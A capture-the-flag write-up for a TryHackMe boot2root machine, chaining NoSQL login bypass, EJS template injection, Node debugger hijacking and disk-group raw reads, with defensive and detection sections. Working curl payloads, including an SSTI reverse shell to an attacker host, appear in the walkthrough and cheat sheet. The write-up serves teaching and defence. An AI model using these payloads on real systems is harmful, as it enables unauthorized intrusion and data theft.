# CTF Writeup — “Do Not Disturb”

### TryHackMe · Hacker Holidays Day 7 · Web / Boot2Root · Medium · 90 Points

**User Flag:** `THM{XXXXXXXX}`
**Root Flag:** `THM{XXXXXXXX}`

---

## TL;DR

This challenge combines **four vulnerabilities and misconfigurations** into a complete Boot2Root attack chain.

First, a **NoSQL injection** bypasses the login without requiring the real password. The authenticated staff panel then exposes a preview function that renders user-controlled input as an **EJS template**, resulting in **Server-Side Template Injection (SSTI)** and remote code execution.

The resulting shell gives us access as the `poolside` user and reveals the **user flag**.

For privilege escalation, process enumeration reveals another user, `pipelinesvc`, running a Node.js application with the **`--inspect` debugger exposed**. Attaching to the debugger provides code execution inside that process.

Because `pipelinesvc` belongs to the **`disk` group**, we can access the raw disk device. Using `debugfs`, the root flag can be read directly from the filesystem without becoming root.

### Complete Attack Chain

```text
Login rejects normal credentials
        │
        ▼
NoSQL injection → authentication bypass
        │
        ▼
Session cookie → /staff
        │
        ▼
EJS template preview
        │
        ▼
SSTI → Node.js RCE
        │
        ▼
Reverse shell as poolside
        │
        ▼
USER FLAG
        │
        ▼
Find pipelinesvc Node process
        │
        ▼
Node --inspect on 127.0.0.1:9229
        │
        ▼
Attach debugger → code execution as pipelinesvc
        │
        ▼
pipelinesvc ∈ disk group
        │
        ▼
debugfs → raw disk read
        │
        ▼
ROOT FLAG
```

---

# 1. Understanding the Four Key Ideas

Before exploiting the machine, it helps to understand the four concepts involved.

### NoSQL Injection

When an application uses MongoDB for authentication, a login query may conceptually look like:

```text
username = X
AND
password = Y
```

If user input is not properly validated, MongoDB operators can sometimes be injected instead of supplying a normal string.

For example:

```text
password[$ne]=1
```

can be interpreted as:

```javascript
{
    password: {
        $ne: "1"
    }
}
```

Meaning:

> The password is not equal to `1`.

This can cause the authentication query to return a user without knowing the actual password.

---

### SSTI — Server-Side Template Injection

The staff panel uses **EJS** templates.

A normal EJS expression looks like:

```ejs
<%= name %>
```

The important detail is that EJS evaluates JavaScript on the **server**.

If an application allows an attacker to control the template itself, JavaScript can potentially be executed on the server.

That turns:

```text
Template injection
        ↓
JavaScript execution
        ↓
Command execution
        ↓
Remote shell
```

---

### Node.js `--inspect`

Node.js provides a debugger through the `--inspect` option.

For example:

```text
node --inspect=127.0.0.1:9229 app.js
```

The debugger allows code to be executed inside the running Node.js process.

Because that code executes with the same privileges as the process owner, compromising the debugger effectively means executing code as that user.

Leaving a production process with an exposed debugger is therefore extremely dangerous.

---

### The `disk` Group

Linux users belonging to the `disk` group may have access to raw block devices.

That is particularly dangerous because raw disk access can bypass normal filesystem permissions.

Tools such as `debugfs` can reconstruct files directly from the filesystem stored on the disk.

Therefore:

```text
disk group
     ↓
Raw disk access
     ↓
Filesystem data
     ↓
Potential access to protected files
```

---

# 2. Scope

This writeup covers the **THM-provisioned target machine** and was performed from the TryHackMe AttackBox inside the authorized challenge environment.

---

# 3. Step 1 — Reconnaissance

Start with a basic Nmap scan:

```bash
nmap -sC -sV -p22,80 $IP
```

The important findings are:

```text
22/tcp → SSH
80/tcp → HTTP
```

Port 80 identifies an Express-based Node.js application through:

```text
X-Powered-By: Express
```

SSH only allows public-key authentication, so it does not immediately provide a password-based entry point.

The web application exposes routes such as:

```text
/
 /login
 /logout
 /staff
```

Interestingly, `/staff` returns:

```text
403 Forbidden
```

regardless of the credentials tested.

This is an important clue.

The endpoint is likely protected by a **session**, rather than simply requiring a correct password.

---

# 4. Step 2 — NoSQL Authentication Bypass

Instead of continuing to guess passwords, test whether the login accepts MongoDB operators.

The payload is:

```text
password[$ne]=1
```

Send it with `curl`:

```bash
curl -s -i -c cookie.txt -X POST "http://$IP/login" \
  -d 'username=attendant&password[$ne]=1'
```

The important parts are:

```text
-c cookie.txt
```

which stores the session cookie, and:

```text
password[$ne]=1
```

which attempts to turn the password value into a MongoDB `$ne` operator.

A successful response looks like:

```text
HTTP/1.1 302 Found
Location: /staff
Set-Cookie: connect.sid=<session>; Path=/; HttpOnly
```

The redirect to `/staff` combined with a valid session cookie confirms that the authentication bypass worked.

Now use the saved cookie:

```bash
curl -s -b cookie.txt "http://$IP/staff"
```

The response reveals the **Cabana Desk staff console**, authenticated as:

```text
attendant
```

### Important Lesson

If every credential receives the same `403`, don't automatically assume the password is wrong.

Look at **how the application creates and validates sessions**.

---

# 5. Step 3 — EJS SSTI

The staff console contains a preview functionality.

The application accepts a `template` parameter and renders it using EJS.

The interface even gives us a clue:

```text
EJS — use <%= guest %>
```

First, test whether our input is actually being evaluated.

```bash
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" \
  --data-urlencode 'template=<%= 7*7 %>'
```

The response is:

```text
49
```

This confirms that the server evaluated our JavaScript expression.

We have **Server-Side Template Injection**.

---

# 6. Step 4 — Turn SSTI Into RCE

Because the application uses Node.js, we can reach Node's `child_process` functionality.

In this environment, `require` is not directly available, so we reach it through:

```javascript
process.mainModule.require
```

Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Then submit the SSTI payload:

```bash
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"") %>'
```

The reverse shell connects back to the listener.

We now have a shell as:

```text
poolside
```

Stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# 7. Step 5 — Capture the User Flag

With a shell as `poolside`, read the user's flag:

```bash
cat /home/poolside/user.txt
```

Output:

```text
THM{XXXXXXXX}
```

### User Flag Obtained

```text
THM{XXXXXXXX}
```

At this point, the initial foothold is complete.

---

# 8. Step 6 — Privilege Escalation

Now enumerate running processes.

Look specifically for Node.js processes and debugging ports:

```bash
ps aux | grep -iE 'processor.js|inspect|9229' | grep -v grep
```

The output reveals:

```text
pipelinesvc  599  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

Confirm the port:

```bash
ss -tlnp | grep 9229
```

Result:

```text
LISTEN 127.0.0.1:9229
```

This is extremely interesting.

A different user, `pipelinesvc`, is running Node.js with its debugger enabled.

---

# 9. Step 7 — Hijack the Node Debugger

Attach to the debugger:

```bash
node inspect 127.0.0.1:9229
```

At the debugger prompt:

```text
debug> repl
```

Now commands execute within the Node.js process.

Check the process identity:

```javascript
process.getuid()
```

The result identifies the process as the `pipelinesvc` user.

This means we have effectively obtained code execution in the context of a different user's Node process.

---

# 10. Step 8 — Identify the Raw Disk Device

From the Node REPL, execute a command to identify available block devices:

```javascript
process.mainModule.require('child_process')
  .execSync('ls -la /dev/nvme* 2>/dev/null; cat /proc/partitions').toString()
```

The output identifies the relevant partition:

```text
/dev/nvme0n1p1
```

The device is owned by:

```text
root disk
```

This is the important privilege-escalation clue.

The `pipelinesvc` account belongs to the `disk` group, giving it access to the raw block device.

---

# 11. Step 9 — Read the Root Flag With debugfs

Because the filesystem is available through the raw partition, `debugfs` can access its contents directly.

Run:

```javascript
process.mainModule.require('child_process')
  .execSync('debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>&1').toString()
```

The output reveals:

```text
THM{XXXXXXXX}
```

### Root Flag Obtained

```text
THM{XXXXXXXX}
```

**Rooted.**

---

# 12. Root Cause Summary

The complete compromise resulted from several weaknesses chained together.

### 1. NoSQL Injection

The login accepted attacker-controlled object syntax and allowed a MongoDB operator to bypass authentication.

### 2. SSTI

The application rendered user-controlled EJS templates on the server, allowing arbitrary JavaScript execution.

### 3. Exposed Node Debugger

A privileged Node.js process was running with:

```text
--inspect=127.0.0.1:9229
```

This allowed another local user to attach to the process and execute code as `pipelinesvc`.

### 4. Dangerous `disk` Group Membership

The `pipelinesvc` account belonged to the `disk` group, providing raw block-device access.

Together:

```text
NoSQL Injection
      ↓
Authentication Bypass
      ↓
SSTI
      ↓
RCE
      ↓
poolside
      ↓
Node Debugger
      ↓
pipelinesvc
      ↓
disk group
      ↓
Raw Disk Access
      ↓
Root Flag
```

---

# 13. Defensive Takeaways

### Prevent NoSQL Injection

Validate and cast input types before using them in database queries.

For example, a password expected to be a string should not accept objects or arrays:

```javascript
typeof password === 'string'
```

Reject unexpected data structures before they reach the database layer.

---

### Prevent SSTI

Never treat user-controlled data as a template.

If templating is required, use a safer design that separates **data** from **template code** and applies appropriate escaping and sandboxing.

---

### Disable Node Debugging in Production

Never expose:

```text
--inspect
```

on production services unless there is a strong operational requirement and strict access controls.

A debugger is effectively a code-execution interface.

---

### Review Linux Group Membership

Groups such as:

```text
disk
docker
lxd
shadow
```

can provide extremely powerful access.

Service accounts should not be given unnecessary membership in privileged groups.

---

# 14. Detection Opportunities

These attack techniques also leave useful defensive indicators.

### NoSQL Injection

Monitor authentication requests where fields expected to be strings arrive as objects or arrays.

Suspicious operators include:

```text
$ne
$gt
$regex
```

---

### SSTI / RCE

A process chain such as:

```text
node → bash
```

can be a strong indicator of command execution from a Node application.

---

### Node Debugger Abuse

Monitor for:

```text
--inspect
```

in production process arguments.

Also monitor connections to common Node debugging ports such as:

```text
9229
```

---

### Raw Disk Access

Unexpected use of:

```text
debugfs
dd
```

against devices such as:

```text
/dev/nvme*
/dev/sd*
```

should be investigated, especially when performed by non-root processes.

---

# 15. Command Cheat Sheet

### NoSQL Authentication Bypass

```bash
curl -s -i -c cookie.txt -X POST "http://$IP/login" \
  -d 'username=attendant&password[$ne]=1'

curl -s -b cookie.txt "http://$IP/staff"
```

### Confirm SSTI

```bash
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" \
  --data-urlencode 'template=<%= 7*7 %>'
```

### SSTI → Reverse Shell

```bash
curl -s -b cookie.txt -X POST "http://$IP/staff/preview" \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"") %>'
```

### Find the Node Debugger

```bash
ps aux | grep inspect
ss -tlnp | grep 9229
```

### Attach to the Debugger

```bash
node inspect 127.0.0.1:9229
```

Then:

```text
repl
```

### Test Code Execution

```javascript
process.mainModule.require('child_process')
  .execSync('id').toString()
```

### Read the Root Flag

```javascript
process.mainModule.require('child_process')
  .execSync('debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>&1').toString()
```

---

# 16. Two Things Worth Remembering

### **1. A universal 403 can be a session clue**

If an endpoint returns the same `403` regardless of credentials, don't immediately waste time brute-forcing passwords.

Ask:

> **What does the application require before it considers me authenticated?**

In this challenge, the answer was a valid session.

---

### **2. Some Linux groups are effectively root-equivalent**

Always check:

```bash
id
```

after obtaining a shell.

Groups such as:

```text
disk
docker
lxd
shadow
```

can provide paths to highly privileged operations.

In this challenge, the `disk` group was the final step from a normal service account to reading root's data.

---

# Conclusion

“Do Not Disturb” is a strong example of how several individually interesting weaknesses can be chained into a complete Boot2Root attack.

The final attack path was:

```text
NoSQL Injection
      ↓
Authentication Bypass
      ↓
Staff Console
      ↓
EJS SSTI
      ↓
Node.js RCE
      ↓
poolside
      ↓
User Flag
      ↓
Process Enumeration
      ↓
Node --inspect
      ↓
Debugger Hijacking
      ↓
pipelinesvc
      ↓
disk Group
      ↓
debugfs
      ↓
Root Flag
```

The challenge's main lesson is that privilege escalation does not always require a traditional SUID binary or kernel exploit. **Misconfigured services, debugging interfaces, and dangerous group memberships can be enough.**

**Target and users are fictional challenge material. All actions described were performed against the THM-provisioned machine from the authorized TryHackMe AttackBox.**
